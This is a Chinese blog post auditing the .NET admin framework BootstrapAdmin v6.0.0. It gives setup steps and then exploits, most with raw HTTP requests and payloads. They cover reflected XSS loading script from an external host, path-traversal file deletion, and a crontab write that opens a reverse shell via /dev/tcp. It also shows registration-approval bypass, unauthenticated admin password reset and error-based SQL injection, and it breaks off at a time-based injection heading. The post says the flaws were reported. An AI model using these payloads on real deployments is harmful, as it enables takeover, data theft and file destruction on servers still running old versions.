---
title: BootstrapAdmin 代码审计
date: '2024-04-30 10:20:17'
updated: '2024-04-30 11:18:06'
abbrlink: fd0db471
---
# 0x00 前言
BootstrapAdmin 是基于 RBAC 的 Net7 后台管理框架。该项目获得GVP 奖杯并拥有1w+Star。
本篇文章中的所有发现的相关漏洞已提交 Issues 或通知仓库拥有者本人。此前审计过PHP、JAVA的CMS，这次尝试审计使用.NET Core开发的Web网站。
这个不是传统的.NET WEB FRAMEWORK，因此我们没有看到项目中存在的Asp、Aspx等动态网页文件。紧随我的脚步，让我们一起感受代码审计的魅力。
> .Net Framework 和 .Net Core 都包含了ASP.net，但是.Net Core中的ASP.net被重新设计过了，目前没有看到Web Form这个功能，只看到了MVC这个功能。

[https://gitee.com/LongbowEnterprise/BootstrapAdmin](https://gitee.com/LongbowEnterprise/BootstrapAdmin)
# 0x01 声明
公网上存在部署了旧版本的CMS，旧版本仍然存在这些问题。
请不要非法攻击别人的服务器，如果你是服务器主人请升级到最新版本。
请严格遵守网络安全法相关条例！此分享主要用于交流学习，请勿用于非法用途，一切后果自付。
一切未经授权的网络攻击均为违法行为，互联网非法外之地。
# 0x02 环境
BootstrapAdmin 版本：v6.0.0 MVC模式
.Net SDK版本：5.0.408
系统环境：Window10/CentOS7
数据库：SQLite 数据库/Mysql8数据库
# 0x03 安装
为了更好的测试，我分别在window和Linux上搭建了项目。
下面的教程是在 Centos7 版本上部署的教程。Window部署作者给出了[教程](https://gitee.com/LongbowEnterprise/BootstrapAdmin/wikis/%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B?sort_id=1333477)。
## 1、拉取项目源代码
```python
mkdir /home/project
cd /home/project
git clone https://gitee.com/LongbowEnterprise/BootstrapAdmin.git -b v6.0.0
```
## 2、安装.NET SDK
官方教程：https://learn.microsoft.com/zh-cn/dotnet/core/install/linux-centos
### 你可以选择在线安装（比较慢）
```
rpm -Uvh https://packages.microsoft.com/config/centos/7/packages-microsoft-prod.rpm
yum install -y dotnet-sdk-5.0 git wget net-tools
```
### 本地下载上传压缩包
我使用的是dotnet-sdk-5.0的，其他版本可以在
https://dotnet.microsoft.com/zh-cn/download/dotnet
找到。手动安装的官方教程地址：
https://learn.microsoft.com/zh-cn/dotnet/core/install/linux-scripted-manual#manual-install
dotnet-sdk-5.0下载地址：
https://download.visualstudio.microsoft.com/download/pr/904da7d0-ff02-49db-bd6b-5ea615cbdfc5/966690e36643662dcc65e3ca2423041e/dotnet-sdk-5.0.408-linux-x64.tar.gz
我推荐上传到 `/opt` 目录下，如果你上传到了不同的目录，请修改下面的cd命令。
```python
cd /opt
DOTNET_FILE=dotnet-sdk-5.0.408-linux-x64.tar.gz
export DOTNET_ROOT=$(pwd)/.dotnet
mkdir -p "$DOTNET_ROOT" && tar zxf "$DOTNET_FILE" -C "$DOTNET_ROOT"
export PATH=$PATH:$DOTNET_ROOT:$DOTNET_ROOT/tools
```
代码执行完成后。可以通过`dotnet --list-sdks`命令检查是否安装完毕。
## 3、配置Nginx 反向代理
### 01 安装Nginx
```python
yum install -y wget
cd /usr/local
wget http://nginx.org/download/nginx-1.19.8.tar.gz
yum install -y gcc-c++ pcre pcre-devel zlib  zlib-devel openssl openssl-devel
tar -zxvf nginx-1.19.8.tar.gz
cd /usr/local/nginx-1.19.8/
./configure --with-http_ssl_module
make
make install
ln -s /usr/local/nginx/sbin/nginx /usr/bin/nginx -f
```
### 02 配置Nginx
执行使用命令 `vi /usr/local/nginx/conf/nginx.conf`进行编辑配置文件。
这里参考：
https://gitee.com/LongbowEnterprise/BootstrapAdmin/wikis/Nginx%20%E9%85%8D%E7%BD%AE
我省略了其中443的部分，因为测试环境无需用到。
```python
#user  nobody;
worker_processes  1;

#error_log  logs/error.log;
#error_log  logs/error.log  notice;
#error_log  logs/error.log  info;

#pid        logs/nginx.pid;


events {
    worker_connections  1024;
}

http{
    include       mime.types;
    default_type  application/octet-stream;

    #log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '
    #                  '$status $body_bytes_sent "$http_referer" '
    #                  '"$http_user_agent" "$http_x_forwarded_for"';

    #access_log  logs/access.log  main;

    sendfile        on;
    #tcp_nopush     on;

    #keepalive_timeout  0;
    keepalive_timeout  65;

    #gzip  on;

    upstream ba {
        server localhost:50852;
    }
    
    server {
        listen       80;
        server_name  localhost;
        error_page 404 500 /50x.html;
        proxy_redirect  off;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        location / {
            proxy_connect_timeout  1;
            proxy_pass http://ba/;
        }
        location /NotiHub  {
            proxy_http_version 1.1;
            proxy_set_header Upgrade $http_upgrade;
            proxy_set_header Connection "upgrade";
            proxy_pass http://ba/NotiHub;
        }
        location /TaskLogHub  {
            proxy_http_version 1.1;
            proxy_set_header Upgrade $http_upgrade;
            proxy_set_header Connection "upgrade";
            proxy_pass http://ba/TaskLogHub;
        }
        location = /50x.html {
            root   html;
        }
        error_page  404 500 502 503 504  /50x.html;
    }

    server {
        listen       8080;
        server_name  localhost;
        error_page 404 500 /50x.html;
        proxy_redirect  off;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        location / {
            proxy_connect_timeout  1;
            proxy_pass http://client/;
        }
        location = /50x.html {
            root   html;
        }
        error_page  404 500 502 503 504  /50x.html;
    } 

    upstream client {
        server localhost:49185;
    }    
}
```
### 03 启动Nginx
测试配置正确与否：`/usr/local/nginx/sbin/nginx -t`
运行nginx:：`/usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf`
重新加载：`/usr/local/nginx/sbin/nginx -s reload`
## 4、启动项目
```python
cd /home/project/BootstrapAdmin
export DOTNET_SYSTEM_GLOBALIZATION_INVARIANT=1
nohup dotnet run --project ./src/mvc/admin/Bootstrap.Admin &
nohup dotnet run --project ./src/mvc/client/Bootstrap.Client &
```
启动后任然无法访问，需要关闭防火墙：
```python
systemctl disable firewalld
systemctl stop firewalld
```
启动后访问`http://localhost:50852/Account/Login`即可
## 5、更换数据库
我这里使用的可视化管理Mysql工具为`DBeaver`
先在本地Mysql服务创建一个命名为BA的数据库。注意选择一下字符集`utf8mb4_general_ci`。
![image.png](../../images/posts/45e076caeb60e5e6008a1b001a9c1bd6.png)
创建完数据库后，我们先将`BootstrapAdmin\db\MySQL`目录下的`initData.sql`
在第一行添加`set character set utf8mb4;`
如果不做这一步，在后续操作会无法恢复该文件。
![image.png](../../images/posts/d76eed6a359e1c7b877020761b7331a9.png)
修改完后右键数据库选择恢复数据库。
![image.png](../../images/posts/67bc6d24df1c0c02b272cbe25dc65a59.png)
通过这个功能分别导入两个sql文件。
![image.png](../../images/posts/4a5eea3a4f2f0913f7301ab672ed0327.png)
修改配置文件应用Mysql服务。
`BootstrapAdmin\src\mvc\admin\Bootstrap.Admin\appsettings.json`
![image.png](../../images/posts/d93055d82ff636497c351ac84624a863.png)
`BootstrapAdmin\src\mvc\admin\Bootstrap.Admin\appsettings.Development.json`
![image.png](../../images/posts/6b0ac41873bd07032bfa5e91b46b9d9c.png)
重新生成后出现以下错误。
![image.png](../../images/posts/44d5614461d768c53361c0e804d78435.png)
在Visual Studio帮助旁边的搜索栏搜索 Nuget
![image.png](../../images/posts/abf8179b6d5a32bda805f36a5f7b6263.png)
在弹出的窗口选择`游览`，搜索Mysql，下载安装`Mysql.Data 8.029`这个版本。
因为最新版本不支持.Net5.0。
![image.png](../../images/posts/956d8f945ae59d76d902498b8a00fa5b.png)
安装完毕后重新生成启动即可。
# 0x04 代码审计
## 【前台】错误返回页面存在反射型XSS（无Cookie）
### 漏洞利用
经典的 a 标签 href 属性XSS注入，使用简单 payload：`javascript:alert(8007)`
点击返回首页时可以触发Script脚本。
请求路径：`http://localhost:50852/Home/Error/404?ReturnUrl=` 
![image.png](../../images/posts/21039baa0ba24ad73523f63c33a59b74.png)
使用 xssye.com 构造利用方式。
`javascript:eval(atob`dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHA6Ly94c3N5ZS5jb20vejNxVyI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=`)`
参考：
![image.png](../../images/posts/147b358f70ca9156d653bf1fe96ceceb.png)
当我们点击返回首页时执行了我们的跨站脚本，可以在xssye.com后台中看到数据，但是没有获取到Cookie。
![image.png](../../images/posts/e318936abf437982010fb0e09c7d5c66.png)
Cookie都有 HttpOnly 所以获取不到。
![image.png](../../images/posts/09612eb05f031dc5613e153b83191f0a.png)
### 漏洞定位
`BootstrapAdmin\src\mvc\admin\Bootstrap.Admin\Controllers\HomeController.cs`
![image.png](../../images/posts/e7583de3733b01f35a1875619ba6a337.png)
这里的 returnUrl 是通过Request Query获取的，也就是GET方式请求获取Query数据。
`Request.Query[CookieAuthenticationDefaults.ReturnUrlParameter].ToString();`
对应的`cshtml`文件
`BootstrapAdmin\src\mvc\admin\Bootstrap.Admin\Views\Shared\Error.cshtml`
![image.png](../../images/posts/1da4ee76a15ef710708ee9b7902fe308.png)
> `@Url.Content` 方法返回一个应用程序中的虚拟路径的绝对 URL。它可以用于生成包含应用程序根路径的 URL，这对于在视图中使用相对路径引用 CSS、JavaScript 和图像等文件非常有用。
> 在 Razor 视图中，默认情况下会进行 HTML 实体编码，以避免跨站点脚本攻击。这意味着在模型属性的值插入到 HTML 中时，会自动将特殊字符（如 <, >, & 等）转换成对应的 HTML 实体编码。


## 【后台】头像任意文件删除
权限：后台普通用户权限
### 漏洞利用
为了测试，我现在目录`BootstrapAdmin\src`下新建命名为`don't_delete_me.txt`的文件。
![image.png](../../images/posts/2e4ae4badc5b3294efca5ddd98b98688.png)
使用管理员默认账户登录后台：Admin/123789
访问：`http://localhost:50852/Admin/Profiles`
在左侧栏找到个人中心，进入后找到修改头像处。
![image.png](../../images/posts/36d0bf9219120fe55ea8d416db714fec.png)
任意上传一张图像，然后点击删除。抓包修改包的内容。
头像存储的相对路径是`BootstrapAdmin\src\mvc\admin\Bootstrap.Admin\wwwroot\images\uploader`
将 key 修改成`\..\..\..\..\..\..\don't_delete_me.txt`
![image.png](../../images/posts/c945cbcb647c413ae5efb96d4e2491fc.png)
请求包：
```
POST http://localhost:50852/api/Profiles/Delete HTTP/1.1
Host: localhost:50852
Content-Length: 42
sec-ch-ua: "Chromium";v="89", ";Not A Brand";v="99"
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://localhost:50852
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:50852/Admin/Profiles
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: .AspNetCore.Antiforgery.a2HlFfgw_P8=CfDJ8PEsgr_mSMxFurYJD90kTRdDutnyswhgQAajLp51T2b4dYv1uTICnGVL5VbVaPJDUc3r70GoHtQB2Vj7oYm-nLhDCG9W_mj5-8IB2FhB271EWYmMSylfSZlNpTFa3Bjf2r_UhJSfp1Bd5BPtXwzV6_I; .AspNetCore.Cookies=CfDJ8PEsgr_mSMxFurYJD90kTRfdrk0fKJRgNBBGJh87RD57SJijn1hT9IhdiA0zf0iJmcS8FhwRVuJ0vRc_TtyVbrYpbGm_YrC8ZzLRK9P8u4AZImRchxPy9WBPUhMMx1p9xex3eUomUXRKzT5yx12qpn93BDSxLApgseVLQLucY5kAtph1GMb1V17dFqbe0ieA99eoYMLFYT_KBcncZFdFE7cAUAJWj0msoM8Uwb9aRSXaVdqklQvxohYvXa0zEFcUSzKpbJbYWIGYDMzW3WJvehlx6i8nDEneQaHVeR801qSl
Connection: close

key=\..\..\..\..\..\..\don't_delete_me.txt
```
我在Linux系统上创建了delete_me.txt文件。
![image.png](../../images/posts/49c635d1248633f0db0e8cfca88bc452.png)
通过使用 payload`/../../../../../../../../delete_me.txt`将文件删除了。
![image.png](../../images/posts/e1458e53350a76fedada77bd91827c05.png)
报错是因为我修改了全局的头像路径不用理会。那么有人可能问了，如果修改了字典里的头像路径为什么还能删除我们指定的文件呢？
原因是它是这么拼接的：
`fileName = Path.Combine(env.WebRootPath, $"images{Path.DirectorySeparatorChar}uploader{Path.DirectorySeparatorChar}{fileName}");`
直接写死了`images/uploader`而不是通过字典获取路径。具体的代码在下面可以看到。
### 漏洞定位
请求路径为`http://localhost:50852/api/Profiles/Delete`
后端处理文件为：
`BootstrapAdmin\src\mvc\admin\Bootstrap.Admin\Controllers\Api\ProfilesController.cs`
对`api/Profiles`的Post请求就会进入到这个函数，它的请求格式为`api/Profiles/{id}`
这里先对id进行了判断，然后获取我们传入的Key。这里的`[FromForm] DeleteFileCollection files`已经将请求body的参数转换成`DeleteFileCollection`对象了，所以`files.Key`就是我们输入的`\..\..\..\..\..\..\don't_delete_me.txt`。
![image.png](../../images/posts/c5d9cbc3122004a62a86bcac1258f6e9.png)
> `Path.Combine` 函数用于将字符串组合成文件或目录路径。它是一种安全的连接路径的方式，因为它会自动添加正确的目录分隔符。但是，需要注意的是，Path.Combine不会验证或清理输入路径。开发人员有责任确保输入路径是安全的，不包含任何恶意或意外字符。

这里没有对拼接的路径进行任何过滤，所以我们可以进行目录遍历删除文件。
## 【后台】头像任意文件上传
权限：后台普通用户权限
### 漏洞利用
使用管理员默认账户登录后台：Admin/123789
访问`http://localhost:50852/Admin/Users`
新建一个名为 root 的账户，密码随意，也不需要给权限。
![image.png](../../images/posts/6929491fb22899fdd4cae27311a3b8c1.png)
然后进入字典表维护`http://localhost:50852/Admin/Dicts`
在字典代码输入`~/../../../../../../../../../var/spool/cron/`
这里的`../`多少无所谓主要是要跳到根目录，其次注意的是Ubuntu的计划任务目录在
`/var/spool/cron/crontabs`
![image.png](../../images/posts/d3efe954501d1a9a01e5878733080d25.png)
我们退出Admin账户，重新登录root账户，然后到个人中心处上传图片后抓包。
![image.png](../../images/posts/d4705dda851932ad7313d3297d0de2cf.png)
```
Content-Disposition: form-data; name="file_data"; filename="."
Content-Type: image/jpeg

* * * * * bash -i >& /dev/tcp/192.168.68.1/6666  0>&1%0a
```
需要注意的是我们需要将`%0a`进行URL编码解码发包才可以。
![image.png](../../images/posts/5ac175e6ee0e70dc9d6a5ab94205528a.png)
解码之后发送请求。
![image.png](../../images/posts/ee5c42c7c91e1789c9b5b1002da3b4b5.png)
到测试服务器上查看，发现已经写入。
![image.png](../../images/posts/3794aa481d3a5142d716d9b58742fbc0.png)
Windows 开 nc 监听等待一分钟也能连上，至此成功Getshell。
![image.png](../../images/posts/47ad5409abba24e52d23189f4d34fe11.png)
### 漏洞定位
`BootstrapAdmin\src\mvc\admin\Bootstrap.Admin\Controllers\Api\ProfilesController.cs`
这里的 fileName 是使用当前用户名拼接上传文件的 filename 得来的，所以我们在上传文件的时候修改后缀 .asp 即可上传木马文件。
![image.png](../../images/posts/36e3d5abfd9a89c37a1a8cbd8e9f6c8b.png)
为什么无法解析呢？我们往下看。
`BootstrapAdmin\src\mvc\admin\Bootstrap.Admin\Startup.cs`
app.UseStaticFiles() 中间件默认配置为从“wwwroot”目录提供文件服务。
![image.png](../../images/posts/51d8d9118ddf50cc094a0e99ba6c228b.png)
设置了这个中间件去访问动态文件 asp 时会因为`app.UseStatusCodePagesWithReExecute("/Home/Error/{0}");`返回`/Home/Error/404`的界面。
访问：`http://localhost:50852/Admin/Profiles`
![image.png](../../images/posts/ef845e1d9a8d5e1fe8685857e0e01d41.png)
找到修改头像，选择一句话木马后上传，抓包修改后缀名为 asp 放包即可。
![image.png](../../images/posts/748a4c8fb0ea12acda037a09b94e0739.png)
可以看到文件已经上传成功了。
![image.png](../../images/posts/e955b9a087cc825b56cab27cbc6691a2.png)
虽然文件上传成功，但很可惜，无法解析。
![image.png](../../images/posts/25cae99a62a25ba6e3c40d25ab99ba44.png)
我注意到`fileName = $"{userName}{Path.GetExtension(uploadFile.FileName)}";`
路径拼接中使用了`userName`，那我可以尝试通过修改用户名来达到目录穿越的目的。
更新用户名，`PUT http://localhost:50852/api/Profiles`![image.png](../../images/posts/ee33d5fccec19515542afcacc55583c0.png)
很可惜存在 UserName与 当前登录用户名进行判断，我们没办法通过这个判断。
`BootstrapAdmin\src\mvc\admin\Bootstrap.Admin\Controllers\Api\ProfilesController.cs`
![image.png](../../images/posts/bde289dc4b10a33a042f209726a72f66.png)
还有一个地方可以编辑，那就是用户管理。
![image.png](../../images/posts/494a85efc53998bc598c70568acb296e.png)
抓包修改之后修改UserName，但是实际上没有修改成功。
![image.png](../../images/posts/c024bc662f985ce4020a4ec4031c1f2e.png)
这里没有使用到我们的 UserName，但我们可以新建一个账户。
`BootstrapAdmin\src\mvc\admin\Bootstrap.Admin\Controllers\Api\UsersController.cs`
![image.png](../../images/posts/f8a629eb2e73b26049487bf7be731d28.png)
随意创建一个用户。
![image.png](../../images/posts/0042a225441d3695a1976df1fae000f6.png)
修改请求中的 UserName
![image.png](../../images/posts/8eb52c9774f0c9a97656d824eae76116.png)
`BootstrapAdmin\src\mvc\admin\Bootstrap.Admin\Controllers\Api\UsersController.cs`
![image.png](../../images/posts/35ad61a9852f66711a83bc8434e31cfe.png)
进入到 UserHelper.Save
`BootstrapAdmin\src\mvc\admin\Bootstrap.DataAccess\Helper\UserHelper.cs`
![image.png](../../images/posts/349ba411e29797f65bbc1be82440e6b4.png)
继续进入到 UserHelper.UserChecker，其中针对我们传入的 UserName 进行了长度限制和正则匹配。很显然我们输入的`..\\..\\..\\..\\`没法通过匹配。
![image.png](../../images/posts/835020a8a9817ce1871b343d345401df.png)
我将注意力放到 `webSiteUrl`
`var filePath = Path.Combine(env.WebRootPath, webSiteUrl.Replace("~", string.Empty).Replace('/', Path.DirectorySeparatorChar).TrimStart(Path.DirectorySeparatorChar) + fileName);`
这是最终拼接路径的语句，其中的`webSiteUrl`是通过字典获取的。
`var webSiteUrl = DictHelper.RetrieveIconFolderPath();`
我们到字典表维护功能，就可以找到头像路径的设置。
`http://localhost:50852/Admin/Dicts`
![image.png](../../images/posts/f7a9caef2fea2a0bef2a4720e0ce53e0.png)
将字典代码内容修改成`~/../../../../../../../`。
![image.png](../../images/posts/f4ae464a7b1b142f09d342b118ae20f7.png)
这个时候我们再次上传就可以看到路径已经拼接好了。
![image.png](../../images/posts/47118372b614db42c0913968aa0f3e9b.png)
![image.png](../../images/posts/ba6fb9b8e42aecc58853a557561a1c4c.png)
在 Windows 情况下，我们没有办法通过上传木马GetShell。有人就要问了，覆盖报错页面的 cshtml 就可以了。想法很好，但很可惜，在ASP.NET Core应用程序中，cshtml文件是视图文件，用于呈现HTML内容。这些文件通常在应用程序启动时被编译，并在运行时作为静态文件提供。因此，在程序运行时修改cshtml文件是不可能的。
> Cmd 临时开启 UTF-8编码，可以使用命令 `chcp 65001`。
> 参考 https://learnku.com/articles/55553

我在Linux上传计划任务时卡了一会，因为**crontab的文件要以换行符结尾**。否则没法执行计划任务。但如果直接换行或者Shift+Enter（输入\r\n）结果是`^M`。
> ^M 是一个特殊的字符，也称为回车符或者Carriage Return符号。它通常表示为\r。
> 当在Windows中使用文本编辑器或其他工具编辑文件时，该文件的行结束符可能会以回车符(\r)和换行符(\n)的组合表示。在Linux和Unix系统中，行结束符通常只是一个换行符(\n)。
> 在计划任务语句中，如果包含回车符(\r)，它会被解释为一个命令或参数的一部分，可能会导致计划任务执行失败。

![image.png](../../images/posts/fb967212932847aa3f1f17ad171e56bf.png)
所以我想到需要编辑Hex，而BurpSuite2020及之后版本都没法直观的编辑Hex。
官方给的说明如下（Google翻译过后的）
![image.png](../../images/posts/658ec1fa6df3b7d4d1bc242efc18b449.png)
> 可以通过链接直达该官方说明：https://portswigger.net/burp/documentation/desktop/tools/inspector/modify-requests

也就是先添加一个字符，然后选中，再通过右侧小部件编辑。
![image.png](../../images/posts/d94778501f886205dbd2041acf096b10.png)
但是我试了一下还是不行，不如直接使用`%0a`URL解码一下就行了。
## 【前台】越权添加账户
### 漏洞利用
访问登录界面`http://localhost:50852/Account/Login`
![image.png](../../images/posts/242f682c2f5226d9609bfb66e9251f99.png)
点击申请账号，任意填写内容后点击提交并抓包。
![image.png](../../images/posts/1bb988d1b0ab5c23985397fc32705838.png)
修改请求包，添加两项内容：
```python
"ApprovedTime":"2023-05-04 18:44:20.9316203",
"ApprovedBy":"system"
```
![image.png](../../images/posts/82124cdd9997bcbe2e36cd01e335c654.png)
请求包：
```python
POST /api/Register HTTP/1.1
Host: localhost:50852
Content-Length: 150
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost:50852
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:50852/Account/Login?AppId=BA
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: .AspNetCore.Antiforgery.a2HlFfgw_P8=CfDJ8Gs8oXs1rxRKjEnWjDIDxNbJjshI1qzQp5CuMqbXtCMkdL2neNZavWmBhuthWZKWz33fafGSx248iRpmB60ypJVZklddoKZx_r5WUEYb6NlFnr8NezIO2vRdhVD2dAcFCSwZJTQffPO8V4Ua3hJC-90
Connection: close

{"UserName":"test","Password":"123456","DisplayName":"test","Description":"test",
"ApprovedTime":"2023-05-04 18:44:20.9316203","ApprovedBy":"system"}
```
放包后，我们可以使用管理员账号在后台查看用户相关数据。发现已经添加成功。
![image.png](../../images/posts/7c0eb052e999695f7934db642f11bfe9.png)
使用我们刚刚注册的账号进行登录。可以看到能够登录，也就是说**绕过了注册账号需要管理员通过的操作**
![image.png](../../images/posts/d62deea43ef6c53670f08195657d040e.png)
可以看到是 test 账户，现在是默认权限的状态。
![image.png](../../images/posts/447f4e8745a79506479210ffc80c029c.png)
当我访问 `http://localhost:50852/api/Users?search=&sort=RegisterTime&order=desc&offset=0&limit=20&name=&displayName=&_=1683257070879`时可以获取所有用户的用户相关信息。这个功能当前用户应当没有权限，只有管理员有用户管理的面板。属于**越权**操作了。
![image.png](../../images/posts/58656f251979c31d80f1248c15b3d82f.png)
![image.png](../../images/posts/eb7eaa8584b67804b8a337923430351c.png)
### 漏洞定位
我们在请求`http://localhost:50852/api/Register`时会先进入到：
`BootstrapAdmin\src\mvc\admin\Bootstrap.Admin\Controllers\Api\RegisterController.cs`
![image.png](../../images/posts/4bffea3da04a87304c80c5612dd7591d.png)
进入到`UserHelper.Save`函数
`BootstrapAdmin\src\mvc\admin\Bootstrap.DataAccess\Helper\UserHelper.cs`
这里进行了三个判断：

1. 判断输入的用户数据是否符合标准 UserChecker
2. 根据输入的用户名判断用户是否已经存在
3. 判断是否是演示系统，如果是演示系统就根据输入ID判断用户是否已经存在。显然这里不是演示系统。

我们输入用户名是不存在的且符合标准，所以进入到保存操作。
`DbContextManager.Create<User>()?.Save(user)`
![image.png](../../images/posts/75a9753006dab287a898379d2a205cea.png)
`BootstrapAdmin\src\mvc\admin\Bootstrap.DataAccess\User.cs`
到这里直接通过`db.Insert`操作将我们传入的所有数据进行了保存操作。
![image.png](../../images/posts/17183588509c5e15ba48e48ec448fe2c.png)
那么为什么我们添加了`ApprovedTime`和`ApprovedBy`就可以登录了呢？我们去看看登录控制器。
`BootstrapAdmin\src\mvc\admin\Bootstrap.Admin\Controllers\AccountController.cs`
这里存在用户爆破漏洞，因为没有进行验证码校验，不过不是我们目前漏洞的重点。
![image.png](../../images/posts/221fc3d6b9b48be6f0b94ff2bd8e31b2.png)
只要用户名和密码不为空就进入到 `UserHelper.Authenticate`。
`BootstrapAdmin\src\mvc\admin\Bootstrap.DataAccess\Helper\UserHelper.cs`
![image.png](../../images/posts/87b40cc1a1553372498d9b80e6c4dca1.png)
这里进入到`Authenticate`函数
`BootstrapAdmin\src\mvc\admin\Bootstrap.DataAccess\User.cs`
![image.png](../../images/posts/fc9119c50cd589729ee5ef5c55107e55.png)
可以看到这里的查询语句条件中忽略了`ApprovedTime`为空的用户数据，所以只要我们添加了`ApprovedTime`就可以登录。
## 【前台】任意重置密码
### 漏洞利用
进入到后台登录页面`http://localhost:50852/Account/Login`
![image.png](../../images/posts/27120acae6a25c5a1787f44843bc0124.png)
进入到忘记密码界面，账号处输入`Admin`即默认管理员账户登录名称，其他字段信息随意填写。
![image.png](../../images/posts/1126783b7f33e02d749acc44787bfdec.png)
我们提交之后再发送一个重置密码的包即可，这个包不需要任何权限。
![image.png](../../images/posts/065c7a9950c3d638bca90dc0fbf85fc2.png)
请求包：
```python
PUT /api/Register/Admin HTTP/1.1
Host: localhost:50852
Content-Length: 21
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost:50852
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:50852/Account/Login?AppId=BA
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: .AspNetCore.Antiforgery.a2HlFfgw_P8=CfDJ8Gs8oXs1rxRKjEnWjDIDxNbJjshI1qzQp5CuMqbXtCMkdL2neNZavWmBhuthWZKWz33fafGSx248iRpmB60ypJVZklddoKZx_r5WUEYb6NlFnr8NezIO2vRdhVD2dAcFCSwZJTQffPO8V4Ua3hJC-90
Connection: close

{"Password":"123456"}
```
这个时候我们再使用`Admin/123456`即可登录管理员权限账户。
![image.png](../../images/posts/a3b6d3c914c20381bb6cc5088782bf2c.png)
### 漏洞定位
我们先关注到`http://localhost:50852/api/Register/Admin`这个路径的处理函数
`BootstrapAdmin\src\mvc\admin\Bootstrap.Admin\Controllers\Api\RegisterController.cs`
![image.png](../../images/posts/6fe2a0b5be2e2d371083614636f9c8bb.png)
进入到`UserHelper.ResetPassword`函数
`BootstrapAdmin\src\mvc\admin\Bootstrap.DataAccess\Helper\UserHelper.cs`
这里进行了2个判断：

1. 对用户输入的用户名和密码进行标准检查
2. 判断是否是演示系统，如果是演示系统就不允许修改`Admin`和`User`这两个账户。这里不是演示系统。

![image.png](../../images/posts/feb8ffcd4db725cbd78c6ac1c34dcc31.png)
通过了两个判断后，进入到`ResetPassword`函数。
`BootstrapAdmin\src\mvc\admin\Bootstrap.DataAccess\User.cs`
这里先有一个根据传入的用户名判断是否有提交重置密码请求，这里必须要有重置密码请求记录。
通过了这个判断之后，就是进行`db.Update`操作了。
![image.png](../../images/posts/0f2f6ab0da58c97c4c744cf2adfbcd41.png)
## 【后台】查询日志接口存在SQL注入
权限：后台普通用户权限
### 漏洞利用
使用任意账号登录都能请求 `http://localhost:50852/api/Logs`接口
此接口的`Sort`和`Order`没有使用Linq进行转义导致注入漏洞的产生。
**基于报错注入：**
`http://localhost:50852/api/Logs?OperateTimeEnd=&OperateTimeStart=2023-05-06&limit=1&offset=0&operateType=&order=concat(0x7e,database(),0x7e),3)&sort=updatexml(1,`
![image.png](../../images/posts/b25f97206aa7347abd324de90b646b30.png)
请求包：
```python
GET /api/Logs?OperateTimeEnd=&OperateTimeStart=2023-05-06&limit=1&offset=0&operateType=&order=concat(0x7e,database(),0x7e),3)&sort=updatexml(1, HTTP/1.1
Host: localhost:50852
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: .AspNetCore.Antiforgery.a2HlFfgw_P8=CfDJ8Gs8oXs1rxRKjEnWjDIDxNYIk8qTrVAchQMdNQDsqE0fBboelKrRDrSlcNGeSNFI1jNSivWc5b5t8tkI1SES8xumGS6HdMyCcTFdEqocP7y74P26iG_iKW6RRYrazzhQNkcvDfYzcxAzdbm-f5FqO88; .AspNetCore.Cookies=CfDJ8Gs8oXs1rxRKjEnWjDIDxNaE3CXKRjutQdTU9MI2xO1nRk7yd-9PgK41JPtnvxNoybJwZclKPosGkyWisjmmpaB2xJkLw04jWnB1ZpvrHYBNhbm02wR62IXpOdYVnmBRgSs7UrKRDnk-fAR9CRWNiYrLr5Dq9irg-R7uxSbuwu1A-eKvcQUsLvd_nvlRmExl_ay-3wo0v1rvUe1pwpbhyzzda5HLQbh0XOMmor5h0q66o9vFYO5dgBUGqYxpBidWCv0PoKzqGQeA_8dxsBolEctWPrQEKakod3mJ1HrIKQR1
Connection: close


```
**基于时间注入：**
